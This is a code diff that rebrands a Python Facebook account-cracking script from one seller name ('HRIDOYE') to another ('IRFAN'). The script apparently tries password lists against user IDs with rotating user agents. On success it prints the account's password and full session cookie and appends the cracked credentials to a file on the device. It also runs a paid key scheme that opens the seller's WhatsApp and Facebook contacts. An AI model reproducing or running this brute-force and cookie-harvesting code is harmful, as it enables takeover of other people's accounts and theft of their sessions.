@@ -240,13 +240,13 @@ def admin():
 	print(' [0] Back to Main menu')
 	bal = input('Choose option >>> ')
 	if bal =='1':
-		os.system('xdg-open https://wa.me/+8801790210942');time.sleep(1)
+		os.system('xdg-open https://wa.me/+8801617278350');time.sleep(1)
 		admin()
 	if bal =='2':
-		os.system('xdg-open https://facebook.com/groups/735209235013629/');time.sleep(1)
+		#os.system('xdg-open https://facebook.com/groups/735209235013629/');time.sleep(1)
 		admin()
 	if bal =='3':
-		os.system('xdg-open https://github.com/HRIDOYE-143');time.sleep(1)
+		#os.system('xdg-open https://github.com/IRFAN-143');time.sleep(1)
 		admin()
 	if bal =='0':
 		Main()
@@ -292,7 +292,7 @@ def b(uid,pwx,tl):
     try:
         for ps in pwx:
             session = requests.Session()
-            sys.stdout.write(f'\r \033[1;90m[\033[1;93m[HRIDOYE]\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
+            sys.stdout.write(f'\r \033[1;90m[\033[1;93m[IRFAN]\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
             sys.stdout.flush()
             pro = random.choice(ugen)
             #oo=random.choice(sss)
@@ -332,10 +332,10 @@ def b(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print(f'\r\33[1;92m [HRIDOYE-OK] '+uid+' | '+ps+'\33[0;92m')
+                print(f'\r\33[1;92m [IRFAN-OK] '+uid+' | '+ps+'\33[0;92m')
                 print(f'\r\033[1;92m=[💚]=COOKIE : '+coki)
                 oks.append(cid)
-                open('/sdcard/HRIDOYE-ok.txt', 'a').write(uid+' | '+ps+' | '+uid+'\n')
+                open('/sdcard/IRFAN-ok.txt', 'a').write(uid+' | '+ps+' | '+uid+'\n')
                 break
             else:
                 continue
@@ -344,7 +344,7 @@ def b(uid,pwx,tl):
 
         pass
 def superuser():
-    UMO="HRIDOYE-"
+    UMO="IRFAN-"
     uuid = str(os.geteuid()) + str(os.getlogin()) 
     id = "5".join(uuid)
     print(logo)
@@ -353,7 +353,7 @@ def superuser():
         Main()
     else:
         os.system("clear")
-        os.system("xdg-open https://t.me/bdislamicyber")
+        os.system("xdg-open https://www.facebook.com/profile.php?id=100000593919963")
         time.sleep(3.0)
         
         os.system("clear")
@@ -367,12 +367,12 @@ def superuser():
         print ("")
         print (" Your Key : "+UMO+id)
         print ("\n")
-        os.system("espeak \"assalamualaikum ,I am HRIDOYE VAI er  ROBOT and my boss is hridoye.Sir this tool is paid because 100% ok id just now login\"")
+        os.system("espeak \"assalamualaikum ,I am IRFAN VAI er  ROBOT and my boss is IRFAN.Sir this tool is paid because 100% ok id just now login\"")
         name = input(" Your Name : ")
         os.system(f"espeak \"{name} ,prass Enter to send your key\"")
         print ("")
         input(" Press Enter To Send Key")
-        os.system("xdg-open https://www.facebook.com/profile.php?id=100093556008452")
+        os.system("xdg-open https://www.facebook.com/profile.php?id=100000593919963")
         superuser()        
 superuser()
 
